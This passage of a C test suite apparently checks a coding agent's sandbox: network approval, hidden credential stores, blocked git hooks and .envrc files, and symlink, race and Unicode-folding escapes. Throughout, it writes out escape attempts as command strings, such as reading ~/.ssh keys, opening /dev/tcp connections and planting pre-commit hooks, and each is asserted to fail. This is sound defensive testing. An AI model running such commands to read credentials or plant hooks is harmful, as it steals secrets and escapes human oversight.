    T("PATH, HOME and private TMPDIR set",
      strstr(env, "PATH=") && strstr(env, "HOME=") && strstr(env, "/fwsbx-"));
    free(env);

    /* network: external addresses and loopback alike */
    int port = 0, ls = listener(&port);
    T("listener", ls >= 0);
    T("external network blocked", out_has("exec 3<>/dev/tcp/1.1.1.1/80", "Operation not permitted"));
    snprintf(cmd, sizeof cmd, "exec 3<>/dev/tcp/127.0.0.1/%d && echo NET\"\"OK", port);
    T("loopback blocked", out_has(cmd, "Operation not permitted"));
    char *o = run_bash_net(cmd, g_cfg.cwd, 10, &code);
    T("approved command reaches the network", !code && strstr(o, "NETOK"));
    free(o);
    o = run_bash_net("echo x > ../escaped", g_cfg.cwd, 10, &code);
    snprintf(p, sizeof p, "%s/escaped", base);
    T("network approval opens no writes", code > 0 && access(p, F_OK));
    free(o);
    T("the next command is offline again", out_has(cmd, "Operation not permitted"));

    /* network approval through the agent loop */
    char args[1500];
    snprintf(args, sizeof args,
             "{\"command\":\"exec 3<>/dev/tcp/127.0.0.1/%d && echo NET\\\"\\\"OK\",\"network\":true}", port);
    Ui ask = {.interactive = true, .approve_cmd = sbx_ask};
    Ui oneshot = {.interactive = false};
    perm_free();
    sbx_answer = true;
    T("approved network call runs", agent_bash(args, &ask, "NETOK") && sbx_asks == 1);
    T("prompt names the network", strstr(sbx_asked, "NETWORK") && strstr(sbx_asked, "/dev/tcp/"));
    perm_add_rule(sbx_asked);
    T("prompt cannot become a rule", !perm_allowed(sbx_asked));
    T("asked again next time", agent_bash(args, &ask, "NETOK") && sbx_asks == 1);
    sbx_answer = false;
    T("refused network call does not run", agent_bash(args, &ask, "user denied") && sbx_asks == 1);
    sbx_answer = true;
    T("allow-listed command still asks for network",
      agent_bash("{\"command\":\"ls\",\"network\":true}", &ask, "listed-file") && sbx_asks == 1);
    T("allow-listed command alone does not ask",
      agent_bash("{\"command\":\"ls\"}", &ask, "listed-file") && sbx_asks == 0);
    T("one-shot cannot grant network", agent_bash(args, &oneshot, "network access needs"));
    T("without the flag the agent stays offline",
      agent_bash("{\"command\":\"exec 3<>/dev/tcp/1.1.1.1/80\"}", &oneshot, "[sandbox:"));

    /* --unsafe is the old behaviour */
    g_cfg.unsafe = true;
    T("--unsafe keeps the environment", out_has("env", "tok-leak-123"));
    free(run_bash("echo x > ../unsafe-wrote", g_cfg.cwd, 10));
    snprintf(p, sizeof p, "%s/unsafe-wrote", base);
    T("--unsafe writes outside", !access(p, F_OK));
    g_cfg.unsafe = false;

    /* the binary where sandbox-exec cannot be run: one-shot and bench refuse */
    const char *bin = getenv("FW_BIN");
    static const char *const modes[] = {"\"a question\"", "bench nosuite tag"};
    for (int i = 0; i < 2; i++) {
        snprintf(cmd, sizeof cmd,
                 "/usr/bin/sandbox-exec -p '(version 1)(allow default)"
                 "(deny process-exec (literal \"/usr/bin/sandbox-exec\"))' "
                 "%s -e http://127.0.0.1:%d/v1 %s </dev/null 2>&1; echo \"rc=$?\"",
                 bin ? bin : "./flywheel", port, modes[i]);
        FILE *f = popen(cmd, "r");
        char said[2000] = "";
        size_t n = f ? fread(said, 1, sizeof said - 1, f) : 0;
        said[n] = 0;
        if (f) pclose(f);
        T(modes[i], strstr(said, "Refusing to run") && strstr(said, "rc=2"));
    }

    close(ls);
    unsetenv("FW_TEST_TOKEN");
    setenv("HOME", oldhome, 1);
    free(oldhome);
}

/* path under dir; parents are made */
static const char *under(const char *dir, const char *rel) {
    static char p[4][1024];
    static int i;
    char *o = p[i = (i + 1) % 4];
    snprintf(o, sizeof p[0], "%s/%s", dir, rel);
    for (char *s = o + strlen(dir) + 1; (s = strchr(s, '/')); s++) {
        *s = 0;
        mkdir(o, 0700);
        *s = '/';
    }
    return o;
}

static void in_dir(const char *dir) {
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
}

/* the command's output does not carry the secret */
static void hidden(const char *cmd) {
    char *o = run_bash(cmd, g_cfg.cwd, 20);
    T(cmd, !strstr(o, "TOPSECRET"));
    free(o);
}

static void quiet(const char *cmd) { free(run_bash(cmd, g_cfg.cwd, 20)); }

static void refused(const char *name, char *result) {
    T(name, !strncmp(result, "error:", 6));
    free(result);
}

static const char *bench_call;
static const char *reply_bench(int n) {
    const char *calls[] = {"bash", bench_call};
    return n ? OK_HDR STOPPED "data: [DONE]\n\n" : tool_reply("tool_calls", 1, calls);
}

static void test_sandbox_escapes(void) {
    char tmpl[] = "/tmp/fwescXXXXXX", base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX], cmd[4000];
    if (!mkdtemp(tmpl) || !realpath(tmpl, base)) { T("mkdtemp", false); return; }
    snprintf(home, sizeof home, "%s/home", base);
    snprintf(proj, sizeof proj, "%s/proj", base);
    mkdir(home, 0700);
    mkdir(proj, 0700);
    char *oldhome = str_dup(getenv("HOME"));
    setenv("HOME", home, 1);
    int code = 0;

    /* A: the project root cannot be swapped for a link to HOME */
    in_dir(proj);
    put(under(proj, "f"), "x");
    quiet("p=$PWD; rm f; cd .. ; rmdir \"$p\" && ln -s \"$HOME\" \"$p\"; true");
    struct stat st;
    T("project root not replaced", !lstat(proj, &st) && S_ISDIR(st.st_mode));
    quiet("mv \"$PWD\" \"$TMPDIR/gone\"");
    T("project root not moved", !lstat(proj, &st) && S_ISDIR(st.st_mode));
    quiet("echo x > \"$HOME/planted\"");
    T("HOME still not writable", access(under(home, "planted"), F_OK) != 0);

    /* A: renaming a directory above a secret does not free it */
    mkdir(home, 0700);
    put(under(home, ".ssh/key"), "TOPSECRET");
    put(under(home, ".config/gh/key"), "TOPSECRET");
    put(under(base, "dotfiles/pg/pgpass"), "TOPSECRET");
    T("link pgpass", !symlink(under(base, "dotfiles/pg/pgpass"), under(home, ".pgpass")));
    in_dir(base);
    hidden("mv home h2; cat h2/.ssh/key home/.ssh/key");
    hidden("mv home/.config c2; cat c2/gh/key home/.config/gh/key");
    hidden("mv dotfiles d2; cat d2/pg/pgpass dotfiles/pg/pgpass");
    hidden("mv dotfiles/pg p2; cat p2/pgpass dotfiles/pg/pgpass");
    T("secrets stayed in place", holds(under(home, ".ssh/key"), "TOPSECRET")
      && holds(under(base, "dotfiles/pg/pgpass"), "TOPSECRET"));
    T("ordinary rename still works", out_has("mkdir r1 && mv r1 r2 && echo moved-ok", "moved-ok"));

    /* B: a store that does not exist yet, under a link */
    mkdir(under(base, "store"), 0700);
    T("link cargo", !symlink(under(base, "store"), under(home, ".cargo")));
    snprintf(cmd, sizeof cmd, "%s/vault/token", base);   /* dangling: no vault/ yet */
    T("link vault", !symlink(cmd, under(home, ".vault-token")));
    quiet("echo x > store/credentials");
    T("unmade store under a link unwritable", access(under(base, "store/credentials"), F_OK) != 0);
    quiet("mkdir -p vault; echo x > vault/token");
    T("dangling store link target unwritable", access(under(base, "vault/token"), F_OK) != 0);

    /* C: the file tools keep out of the stores */
    T("link in project", !symlink("home/.ssh/key", under(base, "innocent")));
    refused("write into .ssh", tool_write_file(base, "home/.ssh/authorized_keys", "k"));
    refused("write, other case", tool_write_file(base, "HOME/.SSH/key", "k"));
    refused("write through link", tool_write_file(base, "innocent", "k"));
    refused("write secret link target", tool_write_file(base, "dotfiles/pg/pgpass", "k"));
    refused("write unmade store", tool_write_file(base, "home/.m2/settings.xml", "k"));
    T("no parents made for a refused write", access(under(home, ".m2"), F_OK) != 0);
    refused("edit secret", tool_edit_file(base, "home/.ssh/key", "TOP", "BOT"));
    T("secrets unchanged", holds(under(home, ".ssh/key"), "TOPSECRET")
      && holds(under(base, "dotfiles/pg/pgpass"), "TOPSECRET"));
    char *r = tool_write_file(base, "home/.sshx/ok", "k");
    T("neighbour of a store writable", !strncmp(r, "ok:", 3));
    free(r);

    /* G: more credential files; a history file linked to /dev/null */
    static const char *const creds[] = {".npmrc", ".pypirc", ".cargo/credentials.toml",
        ".gem/credentials", ".zsh_history", ".python_history", ".m2/settings.xml",
        ".gradle/gradle.properties"};
    in_dir(proj);
    for (int i = 0; i < (int)(sizeof creds / sizeof *creds); i++) {
        put(under(home, creds[i]), "TOPSECRET");
        snprintf(cmd, sizeof cmd, "cat \"$HOME/%s\"", creds[i]);
        hidden(cmd);
    }
    T("link history", !symlink("/dev/null", under(home, ".bash_history")));
    T("/dev/null survives a linked history file", out_has("echo a >/dev/null && echo null-ok", "null-ok"));

    /* D: instruction files that lead to a secret are not sent anywhere */
    const char *bin_cwd[] = {proj, base};
    put(under(home, ".ssh/key"), "TOPSECRET");
    char *dump = str_dup(under(base, "requests"));
    bad_reply = OK_HDR STOPPED "data: [DONE]\n\n";
    for (int i = 0; i < 2; i++) {
        /* a target outside the project, then a secret inside it */
        T("link AGENTS", !symlink(under(home, ".ssh/key"), under(bin_cwd[i], "AGENTS.md")));
        put(under(bin_cwd[i], "CLAUDE.md"), "plain-instructions");
        unlink(dump);
        req_dump = dump;
        pid_t srv = serve(reply_fixed);
        char *av[] = {"flywheel", "-C", (char *)bin_cwd[i], "-e", g_cfg.endpoint, "-T", "1", "hi", NULL};
        run_flywheel(false, av);
        stop(srv);
        req_dump = NULL;
        char *sent = slurp(dump);
        T("linked secret not sent", sent && !strstr(sent, "TOPSECRET"));
        T("next instruction file used", sent && strstr(sent, "plain-instructions"));
        free(sent);
        unlink(under(bin_cwd[i], "AGENTS.md"));
    }
    free(dump);

    /* E: bench collects no model-made links */
    put(under(base, "suite/tasks/t1/prompt.md"), "hi\n");
    snprintf(cmd, sizeof cmd, "{\"command\":\"ln -s '%s/.ssh/key' leak.txt; ln -s '%s' leakdir; "
             "echo ok > real.txt\"}", home, home);
    bench_call = cmd;
    pid_t srv = serve(reply_bench);
    char suite[PATH_MAX + 8];
    snprintf(suite, sizeof suite, "%s/suite", base);
    char *bv[] = {"flywheel", "-e", g_cfg.endpoint, "-T", "3", "bench", suite, "tg", "t1", NULL};
    run_flywheel(false, bv);
    stop(srv);
    T("bench collected the real file", !access(under(suite, "runs/tg/t1/files/real.txt"), F_OK));
    T("bench skipped a file link", lstat(under(suite, "runs/tg/t1/files/leak.txt"), &st) != 0);
    T("bench skipped a directory link", lstat(under(suite, "runs/tg/t1/files/leakdir"), &st) != 0);

    /* F: project files that run later outside the sandbox */
    in_dir(proj);
    unlink(under(proj, "CLAUDE.md"));
    /* no repository: nothing may make one */
    quiet("mkdir -p x/hooks; echo evil > x/hooks/pre-commit; mv x .git");
    quiet("mkdir .GIT; ln -s x .git; echo 'gitdir: x' > .git");
    T(".git cannot be planted", lstat(under(proj, ".git"), &st) != 0);
    refused("file tool cannot start .git", tool_write_file(proj, ".git/hooks/pre-commit", "evil"));
    T("no .git left behind", lstat(under(proj, ".git"), &st) != 0);
    quiet("echo evil > .EnvRc; echo evil > e; mv e .envrc; ln e .envrc");
    T(".envrc cannot be made", access(under(proj, ".envrc"), F_OK) != 0);

    snprintf(cmd, sizeof cmd, "git init -q '%s'", proj);
    T("git init outside the sandbox", !system(cmd));
    char *config = slurp(under(proj, ".git/config"));
    free(run_bash_status("echo a > a && git add a && git -c user.name=t -c user.email=t@t "
                         "commit -qm one", proj, 20, &code));
    T("git add and commit work", !code);
    quiet("echo evil > .git/hooks/pre-commit; echo evil > .git/HOOKS/pre-push");
    quiet("echo evil >> .git/config; echo evil >> .Git/Config; git config core.hooksPath x");
    quiet("echo evil > .git/commondir; echo evil > .git/config.worktree");
    T("hooks not planted", access(under(proj, ".git/hooks/pre-commit"), F_OK)
      && access(under(proj, ".git/hooks/pre-push"), F_OK)
      && access(under(proj, ".git/commondir"), F_OK)
      && access(under(proj, ".git/config.worktree"), F_OK));
    quiet("mv .git old && cp -R old .git; mv .GIT old2; mv .git/hooks h2");
    T(".git not renamed", access(under(proj, "old"), F_OK) && access(under(proj, "old2"), F_OK)
      && access(under(proj, "h2"), F_OK));
    T("git config unchanged", config && holds(under(proj, ".git/config"), config));

    refused("tool: hook", tool_write_file(proj, ".git/hooks/pre-commit", "evil"));
    refused("tool: config, other case", tool_write_file(proj, ".GIT/Config", "evil"));
    refused("tool: hook, odd spelling", tool_write_file(proj, ".git/hoo\xe2\x84\xaas/x", "evil"));
    refused("tool: .envrc", tool_write_file(proj, ".envrc", "evil"));
    refused("tool: edit config", tool_edit_file(proj, ".git/config", "core", "evil"));
    T("link to config", !symlink(".git/config", under(proj, "cfg")));
    refused("tool: config through a link", tool_write_file(proj, "cfg", "evil"));
    T("config still unchanged", config && holds(under(proj, ".git/config"), config));
    r = tool_write_file(proj, ".gitignore", "o\n");
    T("tool: .gitignore writable", !strncmp(r, "ok:", 3));
    free(r);
    free(config);

    setenv("HOME", oldhome, 1);
    free(oldhome);
}

/* outside the sandbox: set up a fixture with a shell script */
static void host(const char *dir, const char *script) {
    char cmd[6000];
    snprintf(cmd, sizeof cmd, "cd '%s' && { %s\n} >/dev/null 2>&1", dir, script);
    T(script, !system(cmd));
}

static bool gone(const char *dir, const char *rel) {
    char p[PATH_MAX];
    snprintf(p, sizeof p, "%s/%s", dir, rel);
    struct stat st;
    return lstat(p, &st) != 0;
}

/* a fresh dummy HOME and an empty project below base */
static char *review_dirs(char *base, char *home, char *proj) {
    char tmpl[] = "/tmp/fwrevXXXXXX";
    if (!mkdtemp(tmpl) || !realpath(tmpl, base)) return NULL;
    snprintf(home, PATH_MAX, "%s/home", base);
    snprintf(proj, PATH_MAX, "%s/proj", base);
    mkdir(home, 0700);
    mkdir(proj, 0700);
    char *old = str_dup(getenv("HOME"));
    setenv("HOME", home, 1);
    return old;
}

/* 1: a directory swapped for a link between the check and the I/O */
static char race_dir[PATH_MAX], race_to[PATH_MAX];
static void swap_for_link(void) {
    char bak[PATH_MAX + 8];
    snprintf(bak, sizeof bak, "%s.bak", race_dir);
    fw_file_hook = NULL;
    if (rename(race_dir, bak) || symlink(race_to, race_dir)) T("swap", false);
}

static void test_file_race(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    put(under(home, ".ssh/key"), "TOPSECRET");
    snprintf(race_to, sizeof race_to, "%s/.ssh", home);
    static const char *const paths[] = {"a/authorized_keys", "b/sub/f", "c/key"};
    for (int i = 0; i < 3; i++) {
        snprintf(race_dir, sizeof race_dir, "%s/%c", proj, 'a' + i);
        mkdir(race_dir, 0700);
        if (i == 2) put(under(proj, "c/key"), "TOPSECRET");
        fw_file_hook = swap_for_link;
        refused(paths[i], i == 2 ? tool_edit_file(proj, paths[i], "TOP", "BOT")
                                 : tool_write_file(proj, paths[i], "evil"));
        fw_file_hook = NULL;
    }
    T("race: nothing written into the store", gone(home, ".ssh/authorized_keys"));
    T("race: nothing made in the store", gone(home, ".ssh/sub"));
    T("race: secret not edited", holds(under(home, ".ssh/key"), "TOPSECRET"));
    setenv("HOME", old, 1);
    free(old);
}

/* 4: APFS folds U+017F to "s"; the project is the home directory */
static void test_unicode_stores(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    mkdir(under(home, ".config"), 0700);
    refused("folded history file", tool_write_file(home, ".zsh_hi\xc5\xbftory", "x"));
    T("no history file", gone(home, ".zsh_history"));
    refused("folded store directory", tool_write_file(home, ".\xc5\xbfsh/authorized_keys", "k"));
    T("no store directory left", gone(home, ".ssh"));
    refused("folded store below .config", tool_write_file(home, ".config/g\xe2\x84\xaa/x/y", "k"));
    refused("project above HOME", tool_write_file(base, "home/.\xc5\xbfsh/k", "k"));
    T("still no store directory", gone(home, ".ssh"));
    mkdir(under(home, "Dok\xc3\xbc"), 0700);
    char *r = tool_write_file(home, "Dok\xc3\xbc/\xc3\xa9t\xc3\xa9.txt", "x");
    T("non-ASCII names away from the stores work", !strncmp(r, "ok:", 3));
    free(r);
    setenv("HOME", old, 1);
    free(old);
}

#define EVIL_CFG "printf '[core]\\n\\tfsmonitor = /usr/bin/false\\n'"

/* 2: repositories below the root, which git outside the sandbox obeys */
static void test_nested_git(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }

    /* a root that is no repository cannot become a bare one */
    in_dir(proj);
    quiet("mkdir objects refs; " EVIL_CFG " > config; echo 'ref: refs/heads/main' > HEAD");
    quiet("echo 'ref: refs/heads/main' > h; mv h head; ln h HEAD");
    T("no HEAD in a root without .git", gone(proj, "HEAD"));
    refused("tool: root HEAD", tool_write_file(proj, "HEAD", "ref: refs/heads/main\n"));

    /* what is there already is closed */
    snprintf(proj, sizeof proj, "%s/repo", base);
    mkdir(proj, 0700);
    host(proj, "git init -q . && git -c user.name=t -c user.email=t@t commit -qm one --allow-empty"
               " && git init -q sub && git init -q --bare .git/modules/m"
               " && git worktree add -q wt -b wt"
               " && mkdir link env && echo 'gitdir: ../.git/modules/m' > link/.git"
               " && echo safe > env/.envrc");
    static const char *const kept[] = {"sub/.git/config", ".git/modules/m/config", "link/.git",
        ".git/worktrees/wt/commondir", "wt/.git", "env/.envrc"};
    char *was[6];
    for (int i = 0; i < 6; i++) was[i] = slurp(under(proj, kept[i]));
    in_dir(proj);
    for (int i = 0; i < 6; i++) {
        char cmd[300];
        snprintf(cmd, sizeof cmd, "echo evil >> %s; echo evil > e; mv e %s", kept[i], kept[i]);
        quiet(cmd);
        T(kept[i], was[i] && holds(under(proj, kept[i]), was[i]));
        refused(kept[i], tool_write_file(proj, kept[i], "evil"));
        free(was[i]);
    }
    quiet("echo evil > sub/.git/hooks/pre-commit; echo evil > .git/modules/m/hooks/pre-commit");
    quiet("echo evil > sub/.git/config.worktree; echo /tmp > sub/.git/commondir");
    char *cfg = slurp(under(proj, "sub/.git/config"));
    quiet("mv .git/modules mods; mv sub sub2; echo evil >> sub2/.git/config;"
          " echo evil > sub2/.git/hooks/pre-commit");
    T("nested config stays closed under a renamed parent", cfg && gone(proj, "mods")
      && holds(under(proj, "sub2/.git/config"), cfg)
      && gone(proj, "sub2/.git/hooks/pre-commit"));
    free(cfg);
    quiet("mv sub2 sub");
    T("nested hooks not planted", gone(proj, "sub/.git/hooks/pre-commit")
      && gone(proj, ".git/modules/m/hooks/pre-commit") && gone(proj, "sub/.git/config.worktree")
      && gone(proj, "sub/.git/commondir"));
    static const char *const no[] = {"sub/.git/hooks/pre-commit", ".git/modules/m/hooks/x",
        "new/.git/config", "new/.GIT/hooks/x", "deep/er/.envrc", "other/.git",
        ".git/worktrees/wt/config.worktree"};
    for (int i = 0; i < (int)(sizeof no / sizeof *no); i++)
        refused(no[i], tool_write_file(proj, no[i], "evil"));

    /* nothing makes a repository below the root */
    int code = 0;
    quiet("git init -q fresh; git clone -q . cl; git worktree add -q wt2 -b wt2");
    free(run_bash_status("git init -q f2", proj, 30, &code));
    T("nested git init fails", code);
    T("no nested repository made", gone(proj, "fresh/.git") && gone(proj, "cl/.git")
      && gone(proj, "f2/.git") && gone(proj, "wt2/.git") && gone(proj, ".git/worktrees/wt2"));
    setenv("HOME", old, 1);
    free(old);
}

/* 3: a linked worktree keeps its index and objects outside the project */
static void test_linked_worktree(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    char wt[PATH_MAX + 8], fake[PATH_MAX + 8];
    snprintf(wt, sizeof wt, "%s/wt", base);
    snprintf(fake, sizeof fake, "%s/fake", base);
    host(proj, "git init -q . && git config user.name t && git config user.email t@t"
               " && git commit -qm one --allow-empty && git branch other && git worktree add -q ../wt -b wt");
    char *config = slurp(under(proj, ".git/config"));
    char *common = slurp(under(proj, ".git/worktrees/wt/commondir"));
    in_dir(wt);
    int code = -1;
    char *o = run_bash_status("echo b > b && git add b && git commit -qm two", wt, 30, &code);
    T("git add and commit in a linked worktree", !code);
    free(o);
    o = run_bash("git branch -u other", wt, 30);
    T("config denial explained", strstr(o, "[sandbox:") && strstr(o, "NOT saved"));
    free(o);
    quiet("echo evil >> ../proj/.git/config; echo evil > ../proj/.git/hooks/pre-commit;"
          " echo evil > ../proj/.git/worktrees/wt/commondir; echo evil > ../proj/.git/worktrees/wt/config.worktree;"
          " echo evil > ../proj/outside; mv ../proj/.git ../proj/g2");
    T("main config and hooks stay closed", config && holds(under(proj, ".git/config"), config)
      && common && holds(under(proj, ".git/worktrees/wt/commondir"), common)
      && gone(proj, ".git/hooks/pre-commit") && gone(proj, ".git/worktrees/wt/config.worktree")
      && gone(proj, "outside") && gone(proj, "g2"));
    /* a .git file the repository does not point back to opens nothing */
    mkdir(fake, 0700);
    char line[PATH_MAX + 64];
    snprintf(line, sizeof line, "gitdir: %s/.git/worktrees/wt\n", proj);
    put(under(fake, ".git"), line);
    in_dir(fake);
    quiet("echo evil > ../proj/.git/objects/planted; echo evil > ../proj/.git/worktrees/wt/planted");
    T("forged .git file opens nothing", gone(proj, ".git/objects/planted")
      && gone(proj, ".git/worktrees/wt/planted"));
    free(config);
    free(common);
    setenv("HOME", old, 1);
    free(old);
}

static void shown(const char *cmd, const char *frag) {
    char *o = run_bash(cmd, g_cfg.cwd, 60);
    T(cmd, strstr(o, frag) != NULL);
    free(o);
}

static void works(const char *cmd) {
    int code = -1;
    char *o = run_bash_status(cmd, g_cfg.cwd, 60, &code);
    if (code) printf("%s\n", o);
    T(cmd, !code);
    free(o);
}

/* reads under home are closed but for the project and the toolchain folders */
static void test_home_reads(void) {
    char base[PATH_MAX], home[PATH_MAX], unused[PATH_MAX], proj[PATH_MAX + 16];
    char *old = review_dirs(base, home, unused);
    if (!old) { T("mkdtemp", false); return; }
    snprintf(proj, sizeof proj, "%s/work/proj", home);
    static const char *const secret[] = {"plain", "work/other/f", ".cargo/config.toml",
        ".cargo/credentials.toml", ".cargo/registry/npmrc", ".ssh/key", "dots/other"};
    for (int i = 0; i < (int)(sizeof secret / sizeof *secret); i++)
        put(under(home, secret[i]), "TOPSECRET");
    static const char *const tools[] = {".cargo/registry/lib", ".rustup/s", "dots/pyenv/v"};
    for (int i = 0; i < 3; i++) put(under(home, tools[i]), "TOOLOK");
    put(under(home, "work/proj/mine"), "PROJOK");
    put(under(home, "dots/extra"), "[alias]\n\tfwx = status\n");
    put(under(home, "dots/ignore"), "skipped\n");
    put(under(home, ".gitconfig"), "[user]\n\tname = t\n\temail = t@t\n"
        "[include]\n\tpath = ~/dots/extra\n[core]\n\texcludesfile = ~/dots/ignore\n");
    /* a toolchain folder linked elsewhere, one linked to home, one to a store;
       a store linked into a toolchain folder */
    host(home, "ln -s dots/pyenv .pyenv && ln -s . .rbenv && mkdir .local"
               " && ln -s ../.ssh .local/bin && ln -s .cargo/registry/npmrc .npmrc");
    in_dir(proj);

    shown("cat mine && ls && pwd -P", "PROJOK");
    static const char *const no[] = {"cat ../../plain", "cat \"$HOME/plain\"", "cat ../../PLAIN",
        "cat \"/System/Volumes/Data$HOME/plain\"", "cat \"/.nofollow$HOME/plain\"",
        "ln -s ../../plain sl; cat sl", "ln ../../plain hl; cat hl", "cp -c ../../plain cl; cat cl",
        "cat ../other/f", "cp -R ../other copy; cat copy/f", "cat ../../dots/other",
        "cat \"$HOME/.rbenv/plain\"",
        /* credentials, in and beside the folders left readable */
        "cat \"$HOME/.cargo/config.toml\"", "cat \"$HOME/.cargo/credentials.toml\"",
        "cat \"$HOME/.cargo/registry/npmrc\"", "cat \"$HOME/.npmrc\"",
        "cat \"$HOME/.local/bin/key\"", "cat \"$HOME/.ssh/key\""};
    for (int i = 0; i < (int)(sizeof no / sizeof *no); i++) hidden(no[i]);
    shown("ls \"$HOME\"", "Operation not permitted");
    shown("ls ..", "Operation not permitted");
    shown("cat \"$HOME/.cargo/registry/lib\"", "TOOLOK");
    shown("cat \"$HOME/.rustup/s\"", "TOOLOK");
    shown("cat \"$HOME/.pyenv/v\"", "TOOLOK");

    /* the tools real builds need */
    host(proj, "git init -q . && git add mine && git commit -qm one");
    put(under(proj, "skipped"), "x");
    put(under(proj, "seen"), "x");
    char *o = run_bash("git status --porcelain", proj, 60);
    T("git status under home, global excludes honoured",
      strstr(o, "?? seen") && !strstr(o, "skipped"));
    free(o);
    shown("git fwx --porcelain", "?? seen");
    works("git add seen && git commit -qm two && git log --oneline");
    host(proj, "git worktree add -q ../wt -b wt");
    char wt[PATH_MAX + 16];
    snprintf(wt, sizeof wt, "%s/work/wt", home);
    in_dir(wt);
    works("echo b > b && git status --porcelain && git add b && git commit -qm three");
    hidden("cat ../other/f ../../plain");
    in_dir(proj);
    put(under(proj, "m.c"), "int main(void){return 0;}\n");
    put(under(proj, "Makefile"), "all:\n\techo MADE\n");
    if (!system("make --version >/dev/null 2>&1")) shown("make", "MADE");
    else printf("unit: SKIP make under the sandbox (not installed)\n");
    if (!system("clang --version >/dev/null 2>&1")) works("clang -o m m.c && ./m");
    else printf("unit: SKIP clang under the sandbox (not installed)\n");
    if (!system("python3 -c 1 >/dev/null 2>&1")) shown("python3 -c 'print(6*7)'", "42");
    else printf("unit: SKIP python3 under the sandbox (not installed)\n");

    /* the home directory as the project: asked for, so read, stores apart */
    in_dir(home);
    shown("cat plain", "TOPSECRET");
    hidden("cat .ssh/key");
    hidden("cat .cargo/credentials.toml");
    hidden("cat .npmrc");

    /* a home whose rules would not match: nothing runs */
    char twice[PATH_MAX + 32];
    snprintf(twice, sizeof twice, "/System/Volumes/Data%s", home);
    if (!access(twice, F_OK)) {
        setenv("HOME", twice, 1);
        o = run_bash("echo ran > ran", proj, 30);
        T("home by a second spelling: command refused",
          !strncmp(o, "error:", 6) && gone(proj, "ran"));
        free(o);
    }
    setenv("HOME", old, 1);
    free(old);
}

/* the command fails and does not show the secret */
static void closed_git(const char *cmd) {
    int code = -1;
    char *o = run_bash_status(cmd, g_cfg.cwd, 60, &code);
    T(cmd, code && !strstr(o, "TOPSECRET"));
    free(o);
}

static bool is_kind(const char *path, mode_t kind) {
    struct stat st;
    return !lstat(path, &st) && (st.st_mode & S_IFMT) == kind;
}

/* a command cannot plant a link that opens something for it, or for a later one */
static void test_home_links(void) {
    char base[PATH_MAX], home[PATH_MAX], unused[PATH_MAX], dots[PATH_MAX + 16], later[PATH_MAX + 16];
    char *old = review_dirs(base, home, unused);
    if (!old) { T("mkdtemp", false); return; }
    snprintf(dots, sizeof dots, "%s/dots", home);
    snprintf(later, sizeof later, "%s/work/later", home);
    put(under(home, "plain"), "TOPSECRET");
    put(under(home, "docs/d"), "TOPSECRET");
    put(under(home, "work/later/f"), "x");
    put(under(home, "dots/ig"), "x\n");
    put(under(home, "dots/ig2"), "x\n");
    put(under(home, "dots/bin/tool"), "TOOLOK");

    /* a relative excludesfile: a link the repository ships, on the first command */
    put(under(home, ".gitconfig"), "[core]\n\texcludesfile = .gi_global\n");
    host(dots, "ln -s ../plain .gi_global");
    in_dir(dots);
    hidden("cat ../plain");
    hidden("cat .gi_global");
    host(dots, "rm .gi_global");
    /* the same by way of TMPDIR */
    quiet("ln -s \"$HOME/plain\" \"$TMPDIR/x\"; ln -s \"$TMPDIR/x\" .gi_global; cat .gi_global");
    hidden("cat ../plain");
    host(dots, "rm -f .gi_global");

    /* global git files and toolchain folders that lead into the project */
    put(under(home, ".gitconfig"), "[core]\n\texcludesfile = ~/dots/ig2\n"
        "\tattributesfile = ~/dots/missing\n");
    host(home, "mkdir -p .config/git .local .m2 && ln -s ../../dots/ig .config/git/ignore"
               " && ln -s ../dots/bin .local/bin && ln -s ../dots/m2 .m2/repository");
    shown("cat \"$HOME/.local/bin/tool\"", "TOOLOK");
    quiet("rm -f ig ig2; ln -s ../plain ig; ln -s ../plain ig2; ln -s ../plain missing;"
          " mv bin bin.old; ln -s ../docs bin; ln -s ../docs m2");
    T("no link planted over what home leads to", is_kind(under(dots, "ig"), S_IFREG)
      && is_kind(under(dots, "ig2"), S_IFREG) && is_kind(under(dots, "bin"), S_IFDIR));
    T("no link planted where home leads", gone(dots, "missing") && gone(dots, "m2"));
    hidden("cat ../plain");
    hidden("cat ../docs/d");
    in_dir(later);                 /* a later session elsewhere */
    hidden("cat ../../plain");
    hidden("cat ../../docs/d");
    shown("cat \"$HOME/.local/bin/tool\"", "TOOLOK");

    /* links that are there anyway open nothing while the project can repoint them */
    static const char *const swapped[][2] = {
        {"rm -f ig && ln -s ../plain ig", "cat ../plain"},
        {"rm -f ig2 && ln -s ../plain ig2", "cat ../plain"},
        {"mv bin bin.old && ln -s ../docs bin", "cat ../docs/d"},
        {"ln -sfh ../docs m2", "cat ../docs/d"},
    };
    in_dir(dots);
    for (int i = 0; i < (int)(sizeof swapped / sizeof *swapped); i++) {
        host(dots, swapped[i][0]);
        hidden(swapped[i][1]);
    }

    /* the home directory as the project: a toolchain folder stays what it is */
    host(home, "rm .config/git/ignore .local/bin .m2/repository .gitconfig && mkdir .rustup");
    in_dir(home);
    quiet("mv .rustup r; ln -s docs .rustup; ln -s docs .pyenv");
    T("toolchain folders not replaced", is_kind(under(home, ".rustup"), S_IFDIR)
      && gone(home, ".pyenv"));

    /* credentials at varying names inside the toolchain folders */
    static const char *const creds[] = {".nvm/versions/node/v1/etc/npmrc",
        ".sdkman/candidates/maven/3.9/conf/settings.xml", ".local/share/uv/tools/t/uv-receipt.toml",
        ".local/share/pipx/venvs/t/pipx_metadata.json", ".cargo/registry/credentials",
        ".cargo/registry/credentials.toml", ".nvm/versions/node/v1/lib/node_modules/npm/npmrc"};
    static const char *const beside[] = {".nvm/versions/node/v1/etc/other",
        ".sdkman/candidates/maven/3.9/conf/logging.xml", ".local/share/uv/tools/t/pyvenv.cfg",
        ".local/share/pipx/venvs/t/pyvenv.cfg", ".cargo/registry/src/c/credentials.rs",
        ".cargo/git/db/d", ".nvm/versions/node/v1/lib/node_modules/npm/package.json"};
